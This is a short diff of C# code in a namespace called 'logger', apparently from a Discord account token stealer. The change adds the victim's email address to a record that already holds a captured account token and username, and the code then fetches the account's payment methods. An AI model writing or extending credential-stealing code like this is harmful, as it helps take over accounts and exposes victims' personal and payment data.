@@ -31,7 +31,7 @@ namespace logger
                     accountssused.Add(client.User.Id.ToString());
                   
                     StringBuilder account = new StringBuilder();
-                    account.Append("token: ||" + token + "|| \nUsename: " + client.User.Username);
+                    account.Append("token: ||" + token + "|| \nUsename: " + client.User.Username + "\nMail: "+client.User.Email);
                     var payments = client.GetPaymentMethods();
 
                     if(payments.Count > 0) {
